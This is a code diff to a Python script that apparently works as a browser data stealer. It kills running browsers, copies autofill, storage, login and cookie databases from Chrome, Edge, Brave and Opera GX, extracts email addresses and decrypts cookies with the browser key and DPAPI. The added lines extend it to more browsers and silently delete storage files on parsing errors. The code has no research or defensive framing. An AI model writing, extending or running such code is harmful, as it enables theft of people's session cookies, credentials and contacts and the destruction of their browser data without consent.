@@ -21,22 +21,24 @@ import json
 USERNAME = getpass.getuser()
 CHROME_BROWSER = 'chrome'
 EDGE_BROWSER = 'edge'
+BRAVE_BROWSER = 'brave'
+OPERAGX = 'operagx'
 chrome_path  = os.path.join(os.getenv('LOCALAPPDATA'),'Google', 'Chrome', 'User Data')
 edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
+brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
+operagx_path = os.path.join(os.getenv('APPDATA'), 'Opera Software')
 firefox_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
 thunderbird_path = os.path.join(os.getenv('APPDATA'), 'thunderbird', 'Profiles')
 local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
 email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
-os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe >nul 2>&1")
+os.system("taskkill /F /IM chrome.exe /IM msedge.exe /IM firefox.exe /IM brave.exe /IM opera.exe >nul 2>&1")
 
 def decode_with_fallback(data):
-    
     for encoding in ['utf-8', 'utf-16-le', 'latin1']:
         try:
             return data.decode(encoding), encoding
         except:
             continue
-
     encoding = detect(data)['encoding'] or 'utf-8'
     return data.decode(encoding, errors='replace'), encoding
 
@@ -51,14 +53,20 @@ def get_decryption_key(local_state_path):
         return dkey
 
 def decrypt_value(encrypted_value, key):
-    try:
-        cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
-        decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
-        # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
-        return decrypted_value.decode()
-    except Exception as e:
-        # print(f"Decryption failed: {e}")
-        return None
+    if encrypted_value.startswith(b'v10'):
+        try:
+            cipher = new(key=key, mode=MODE_GCM, nonce=encrypted_value[3:15])
+            decrypted_value = cipher.decrypt_and_verify(ciphertext=encrypted_value[15:-16], received_mac_tag=encrypted_value[-16:])
+            # print(f"Decrypted cookie:\n  {bytes_to_hex(decrypted_value)}\n  {decrypted_value}")
+            return decrypted_value.decode()
+        except Exception as e:
+            print(f"Decryption failed: {e}")
+            return None
+    else:
+        try:
+            return CryptUnprotectData(encrypted_value)[1]
+        except Exception as e:
+            print(f"ERROR USING DPAPI : {e}")
     
 def find_emails_in_json(data, email_pattern):
     emails = []
@@ -78,8 +86,9 @@ def extract_json(value_str):
         return value_str[json_start.start():]
     return value_str
 
-def chromEdgeOnly(chrome_path, email_pattern, browser_name):
-    profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
+def chromEdgeOnly(chrome_path, email_pattern, browser_name, isdecryptable=False, isopera=False):
+    if isopera: profiles=['Opera GX Stable']
+    else: profiles = [f for f in os.listdir(chrome_path) if f.startswith('Profile') or f == 'Default']
     emails = []
 
     for profile in profiles:
@@ -92,7 +101,6 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
             cur = conn.cursor()
             cur.execute("SELECT value FROM autofill WHERE value LIKE '%@%'")
             for val in cur.fetchall():
-                #print(val[0])
                 try:
                     matches = re.findall(email_pattern, val[0])
                     emails.extend(matches)
@@ -144,6 +152,7 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING LOCAL STORAGE : {e}")
+                os.system(f'del /F /Q /S "{lsDatPath}" >null 2>&1')
 
         ssDatPath = os.path.join(chrome_path, profile, 'Session Storage')
         tssDatPath = os.path.join(os.getenv('TEMP'), f"ssDat_{USERNAME}_{profile_name}_{browser_name}")
@@ -167,13 +176,14 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                         # print(f"for value : {value_enc}")
                         # decoded = f"{key_str} {value_str}"
                         # print(decoded)
-                        emails.extend(re.findall(email_pattern, key_str))
-                        emails.extend(re.findall(email_pattern, value_str))
+                        emails.extend(re.findall(email_pattern, urllib.parse.unquote(key_str)))
+                        emails.extend(re.findall(email_pattern, urllib.parse.unquote(value_str)))
                     except Exception as e:
                         print(f"Error processing entry with key {key_str}: {e}")
                 db.close()
             except Exception as e:
                 print(f"ERROR PARSING SESSION STORAGE : {e}")
+                os.system(f'del /F /Q /S "{ssDatPath}" >null 2>&1')
 
         lDatPath = os.path.join(chrome_path, profile, 'Login Data')
         tlDatPath = os.path.join(os.getenv('TEMP'), f"ldat_{USERNAME}_{profile_name}_{browser_name}.db")
@@ -183,7 +193,6 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
             cur = conn.cursor()
             cur.execute("SELECT username_value FROM logins")
             for val in cur.fetchall():
-                #print(val[0])
                 try:
                     matches = re.findall(email_pattern, val[0])
                     emails.extend(matches)
@@ -214,23 +223,25 @@ def chromEdgeOnly(chrome_path, email_pattern, browser_name):
                     print(f"Error processing URL {val[0]}: {e}")
             conn.close()
 
-        cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
-        tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
-        if os.path.exists(cDatPath):
-            os.system(f'copy "{cDatPath}" "{tcDatPath}"')
-            conn = sqlite3.connect(tcDatPath)
-            cur = conn.cursor()
-            cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
-            decrypted_key = get_decryption_key(local_state_path)[1]
-            #print(decrypted_key)
-            for val in cur.fetchall():
-                encrypted_value = val[0]
-                if encrypted_value is None or len(encrypted_value) == 0:
-                    continue
-                decrypted_value = decrypt_value(encrypted_value, decrypted_key)
-                # print(decrypted_value)
-            
-            conn.close()
+        if isdecryptable:
+            cDatPath = os.path.join(chrome_path, profile, 'Network', 'Cookies')
+            tcDatPath = os.path.join(os.getenv('TEMP'), f"cDat_{USERNAME}_{profile_name}_{browser_name}.db")
+            if os.path.exists(cDatPath):
+                os.system(f'copy "{cDatPath}" "{tcDatPath}"')
+                conn = sqlite3.connect(tcDatPath)
+                cur = conn.cursor()
+                cur.execute("SELECT encrypted_value FROM cookies") # WHERE host_key LIKE '%@gmail%' OR host_key LIKE '%@outlook%' OR host_key LIKE '%mail%'
+                decryption_key = get_decryption_key(local_state_path)[1]
+                #print(decryption_key)
+                for val in cur.fetchall():
+                    encrypted_value = val[0]
+                    if encrypted_value is None or len(encrypted_value) == 0:
+                        continue
+                    print(encrypted_value)
+                    decrypted_value = decrypt_value(encrypted_value, decryption_key)
+                    print(decrypted_value)
+
+                conn.close()
 
     return emails
 
@@ -384,12 +395,16 @@ chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
 edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
 firefox_emails = firefox(firefox_path, email_pattern)
 thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
+brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
+gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isopera=True)
 
 # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
 emails.extend(chrome_emails)
 emails.extend(edge_emails)
 emails.extend(firefox_emails)
 emails.extend(thunderbird_emails)
+emails.extend(brave_emails)
+emails.extend(gx_emails)
 
 try:
     # Method 1: Outlook COM API
